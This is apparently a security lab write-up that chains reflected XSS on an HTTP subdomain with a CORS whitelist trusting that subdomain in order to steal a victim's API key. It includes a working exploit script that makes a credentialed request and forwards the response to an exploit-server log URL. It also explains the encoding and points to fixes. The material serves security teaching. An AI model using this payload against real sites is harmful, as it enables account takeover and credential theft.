# Lab 2 — CORS Vulnerability with Trusted Insecure Protocols

**Difficulty:** Practitioner  
**Type:** XSS + CORS Trust Chain  
**Impact:** Authenticated API key theft via subdomain XSS → Account Takeover

---

## Vulnerability Explanation

The server has a CORS whitelist — it only trusts its own subdomains. This looks secure. But two weaknesses combine into a critical chain:

```
WEAKNESS 1: Whitelist trusts ALL subdomains including HTTP (not just HTTPS)
WEAKNESS 2: One subdomain (stock.*) has a reflected XSS vulnerability

CHAIN:
  XSS on trusted subdomain
        +
  CORS trusts that subdomain
        =
  Full CORS bypass — attacker reads authenticated responses
```

---

## Why This Is Worse Than Lab 1

In Lab 1, the server trusted everyone. Here the server tries to be secure — but trusting a single vulnerable subdomain is equivalent to trusting the attacker directly.

> **Your CORS security is only as strong as the weakest origin you trust.**

---

## Attack Chain

```
1. You host exploit on your server
2. Victim visits your page
3. Your JS redirects victim to:
   http://stock.LAB-ID.net/?productId=4<script>CORS_PAYLOAD</script>&storeId=1
4. XSS fires — your JS runs on the stock subdomain
5. Browser sends: Origin: http://stock.LAB-ID.net  (trusted by main site)
6. Main site returns: ACAO: http://stock.LAB-ID.net + victim's API key
7. JS forwards key to your log server
```

---

## Why HTTP Subdomain Matters

```
HTTPS main site trusts HTTP subdomain
          ↓
HTTP has no TLS → real-world attackers can MITM and inject JS
In the lab → XSS does the same job

Browser rule violated: HTTPS page should never trust HTTP origins
This is a protocol downgrade in the trust relationship
```

---

## Exploit

```html
<script>
  document.location="http://stock.LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

### Why the URL Encoding?

```
%2b  →  +   concatenation operator — raw + breaks the URL parser
%3c  →  <   opening bracket of </script> — raw < closes the tag early
```

---

## Vulnerable Server Code

See [`vuln/vuln.js`](./vuln/vuln.js) and [`vuln/vuln.py`](./vuln/vuln.py)

## Fix

See [`fix/fix.js`](./fix/fix.js), [`fix/fix.py`](./fix/fix.py) and [`fix/notes.md`](./fix/notes.md)

---

## CVSS

```
Score:  9.3 Critical
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
```
